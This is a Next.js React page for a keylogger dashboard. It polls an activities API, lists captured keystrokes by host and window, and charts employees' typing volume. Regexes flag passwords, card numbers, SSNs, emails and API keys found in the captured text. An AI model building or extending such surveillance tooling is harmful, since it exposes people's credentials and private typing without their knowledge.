"use client";

import { useEffect, useState, useCallback, useMemo } from "react";
import Link from "next/link";
import {
  Keyboard, Loader2, Search, Eye, Clock, Users,
  AlertTriangle, ChevronRight, BarChart3, Lock, Filter,
  ChevronDown, Activity
} from "lucide-react";
import {
  AreaChart, Area, XAxis, YAxis, CartesianGrid, Tooltip,
  ResponsiveContainer, BarChart, Bar, Cell
} from "recharts";

export default function KeystrokesPage() {
  const [activities, setActivities] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchQuery, setSearchQuery] = useState("");
  const [hostFilter, setHostFilter] = useState("all");

  const safe = async (url: string, fallback: any = []) => {
    try { const r = await fetch(url); if (!r.ok) return fallback; return await r.json(); } catch { return fallback; }
  };

  const fetchAll = useCallback(async () => {
    const acts = await safe("/api/activities");
    setActivities(Array.isArray(acts) ? acts : []);
    setLoading(false);
  }, []);

  useEffect(() => { fetchAll(); const i = setInterval(fetchAll, 30000); return () => clearInterval(i); }, [fetchAll]);

  const keystrokeActivities = useMemo(() => {
    return activities.filter(a => a.keystrokes && a.keystrokes.trim().length > 0);
  }, [activities]);

  const filteredActivities = useMemo(() => {
    let filtered = keystrokeActivities;
    if (hostFilter !== "all") {
      filtered = filtered.filter(a => a.hostname === hostFilter);
    }
    if (searchQuery) {
      const q = searchQuery.toLowerCase();
      filtered = filtered.filter(a =>
        (a.keystrokes || "").toLowerCase().includes(q) ||
        (a.window_title || "").toLowerCase().includes(q)
      );
    }
    return filtered;
  }, [keystrokeActivities, hostFilter, searchQuery]);

  const hosts = useMemo(() => {
    const set = new Set<string>();
    keystrokeActivities.forEach(a => set.add(a.hostname));
    return Array.from(set).sort();
  }, [keystrokeActivities]);

  const stats = useMemo(() => {
    let totalChars = 0;
    const byHost: Record<string, number> = {};
    const byHour: Record<string, number> = {};

    keystrokeActivities.forEach(a => {
      const chars = (a.keystrokes || "").length;
      totalChars += chars;
      byHost[a.hostname] = (byHost[a.hostname] || 0) + chars;
      const hour = new Date(a.timestamp).getHours().toString().padStart(2, "0") + ":00";
      byHour[hour] = (byHour[hour] || 0) + chars;
    });

    const hostData = Object.entries(byHost)
      .map(([name, chars]) => ({ name, chars }))
      .sort((a, b) => b.chars - a.chars);

    const hourData = Object.entries(byHour)
      .sort()
      .map(([hour, chars]) => ({ hour, chars }));

    return { totalChars, totalEvents: keystrokeActivities.length, hostData, hourData };
  }, [keystrokeActivities]);

  const sensitivePatterns = useMemo(() => {
    const patterns = [
      { name: "Passwords", regex: /password|passwd|pwd/i, count: 0 },
      { name: "Credit Cards", regex: /\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/, count: 0 },
      { name: "SSN", regex: /\b\d{3}-\d{2}-\d{4}\b/, count: 0 },
      { name: "Email Addresses", regex: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/, count: 0 },
      { name: "API Keys", regex: /(?:api[_-]?key|token|secret)[:\s=]+\S+/i, count: 0 },
    ];
    keystrokeActivities.forEach(a => {
      const text = a.keystrokes || "";
      patterns.forEach(p => { if (p.regex.test(text)) p.count++; });
    });
    return patterns.filter(p => p.count > 0);
  }, [keystrokeActivities]);

  if (loading) {
    return (
      <div className="flex flex-col items-center justify-center min-h-[600px] space-y-6">
        <Loader2 className="w-16 h-16 animate-spin text-[#10b981]" />
        <p className="text-[10px] font-black text-gray-600 uppercase tracking-[0.5em]">Loading Keystroke Data...</p>
      </div>
    );
  }

  return (
    <div className="space-y-6 animate-in fade-in duration-700 pb-20">
      {/* Header */}
      <div className="flex justify-between items-end border-b border-white/5 pb-8">
        <div className="space-y-3">
          <div className="flex items-center gap-3">
            <div className="w-1.5 h-1.5 bg-[#10b981]" />
            <span className="text-[10px] font-black text-[#10b981] uppercase tracking-[0.4em]">Keystroke Intelligence</span>
          </div>
          <h1 className="text-5xl font-black tracking-tighter text-white uppercase italic">Key<span className="text-[#10b981]">Logger</span></h1>
        </div>
      </div>

      {/* Stats */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-1">
        <KeyStat label="Total Characters" value={stats.totalChars.toLocaleString()} color="#10b981" icon={Keyboard} />
        <KeyStat label="Keystroke Events" value={stats.totalEvents} color="#3b82f6" icon={Activity} />
        <KeyStat label="Active Employees" value={hosts.length} color="#8b5cf6" icon={Users} />
        <KeyStat label="Sensitive Matches" value={sensitivePatterns.reduce((s, p) => s + p.count, 0)} color="#ef4444" icon={AlertTriangle} />
      </div>

      {/* Charts */}
      <div className="grid grid-cols-1 xl:grid-cols-12 gap-1">
        {/* Timeline */}
        <div className="xl:col-span-8 p-6 border border-white/5 bg-white/[0.01]">
          <h3 className="text-[10px] font-black text-gray-600 uppercase tracking-[0.3em] mb-4">Typing Activity by Hour</h3>
          <div className="h-[250px]">
            <ResponsiveContainer width="100%" height="100%">
              <AreaChart data={stats.hourData}>
                <CartesianGrid strokeDasharray="3 3" stroke="rgba(255,255,255,0.03)" />
                <XAxis dataKey="hour" tick={{ fontSize: 9, fill: "#444", fontWeight: 900 }} />
                <YAxis tick={{ fontSize: 9, fill: "#444" }} />
                <Tooltip contentStyle={{ background: "#0a0a0b", border: "1px solid rgba(16,185,129,0.3)", borderRadius: 0, fontSize: 11, fontWeight: 900 }} />
                <Area type="monotone" dataKey="chars" name="Characters" stroke="#10b981" fill="#10b981" fillOpacity={0.15} strokeWidth={2} />
              </AreaChart>
            </ResponsiveContainer>
          </div>
        </div>

        {/* By Employee */}
        <div className="xl:col-span-4 p-6 border border-white/5 bg-white/[0.01]">
          <h3 className="text-[10px] font-black text-gray-600 uppercase tracking-[0.3em] mb-4">Typing Volume by User</h3>
          <div className="h-[250px]">
            <ResponsiveContainer width="100%" height="100%">
              <BarChart data={stats.hostData.slice(0, 8)} layout="vertical" margin={{ left: 80 }}>
                <CartesianGrid strokeDasharray="3 3" stroke="rgba(255,255,255,0.03)" horizontal={false} />
                <XAxis type="number" tick={{ fontSize: 9, fill: "#444" }} />
                <YAxis dataKey="name" type="category" tick={{ fontSize: 8, fill: "#666", fontWeight: 900 }} width={80} />
                <Tooltip contentStyle={{ background: "#0a0a0b", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 0, fontSize: 11 }} />
                <Bar dataKey="chars" fill="#10b981" fillOpacity={0.6} />
              </BarChart>
            </ResponsiveContainer>
          </div>
        </div>
      </div>

      {/* Sensitive Data Alerts */}
      {sensitivePatterns.length > 0 && (
        <div className="border border-red-500/20 bg-red-500/[0.02]">
          <div className="p-5 bg-red-500/5 border-b border-red-500/20 flex items-center gap-3">
            <AlertTriangle className="w-4 h-4 text-red-500" />
            <span className="text-[10px] font-black text-red-400 uppercase tracking-widest">Sensitive Data Detection</span>
          </div>
          <div className="grid grid-cols-2 md:grid-cols-5 gap-px bg-red-500/10">
            {sensitivePatterns.map((p, i) => (
              <div key={i} className="p-4 bg-[#0a0a0b]">
                <p className="text-[9px] font-black text-gray-500 uppercase tracking-wider mb-1">{p.name}</p>
                <p className="text-2xl font-black text-red-400">{p.count}</p>
                <p className="text-[8px] text-red-500/50 mt-1">events detected</p>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Keystroke Feed */}
      <div className="border border-white/5 bg-white/[0.01]">
        <div className="p-5 bg-black/40 border-b border-white/5 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Eye className="w-4 h-4 text-[#10b981]/50" />
            <span className="text-[10px] font-black text-white uppercase tracking-widest">Keystroke Feed</span>
          </div>
          <div className="flex items-center gap-2">
            <div className="relative">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-3 h-3 text-gray-600" />
              <input type="text" placeholder="Search keystrokes..." value={searchQuery} onChange={e => setSearchQuery(e.target.value)}
                className="pl-8 pr-4 py-2 bg-white/[0.03] border border-white/10 text-[10px] text-white outline-none focus:border-[#10b981]/50 w-48 font-bold" />
            </div>
            <select value={hostFilter} onChange={e => setHostFilter(e.target.value)}
              className="px-3 py-2 bg-white/[0.03] border border-white/10 text-[10px] text-gray-400 outline-none focus:border-[#10b981]/50 font-bold uppercase">
              <option value="all">All Users</option>
              {hosts.map(h => <option key={h} value={h}>{h}</option>)}
            </select>
          </div>
        </div>
        <div className="divide-y divide-white/5 max-h-[500px] overflow-y-auto custom-scrollbar">
          {filteredActivities.length > 0 ? filteredActivities.slice(0, 100).map((act) => (
            <div key={act.id} className="p-4 hover:bg-white/[0.02] transition-colors">
              <div className="flex items-start justify-between mb-2">
                <div className="flex items-center gap-3">
                  <Keyboard className="w-3 h-3 text-[#10b981]/50 shrink-0" />
                  <div>
                    <span className="text-[10px] font-black text-white uppercase">{act.hostname}</span>
                    <span className="text-[8px] text-gray-600 ml-2">in {act.window_title}</span>
                  </div>
                </div>
                <span className="text-[8px] font-mono text-gray-700 shrink-0">{new Date(act.timestamp).toLocaleString()}</span>
              </div>
              <div className="ml-6 p-3 bg-black/40 border border-white/10 font-mono text-[10px] text-[#10b981]/80 whitespace-pre-wrap break-all max-h-[100px] overflow-hidden">
                {act.keystrokes}
              </div>
            </div>
          )) : (
            <div className="py-16 text-center text-gray-700 text-[10px] font-black uppercase tracking-widest">
              {searchQuery ? "No matching keystrokes" : "No keystroke data captured"}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

function KeyStat({ label, value, color, icon: Icon }: any) {
  return (
    <div className="p-6 border border-white/5 bg-white/[0.01] hover:bg-white/[0.03] hover:border-white/10 transition-all duration-300 hover:-translate-y-1 group relative overflow-hidden">
      <div className="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity">
        <Icon className="w-12 h-12" style={{ color }} />
      </div>
      <p className="text-[9px] font-black text-gray-500 uppercase tracking-[0.4em] mb-4">{label}</p>
      <h3 className="text-4xl font-black tracking-tighter opacity-90 group-hover:opacity-100" style={{ color, textShadow: `0 0 15px ${color}40` }}>{value}</h3>
      <div className="absolute bottom-0 left-0 h-0.5 transition-all duration-300 group-hover:w-full w-0" style={{ background: color }} />
    </div>
  );
}
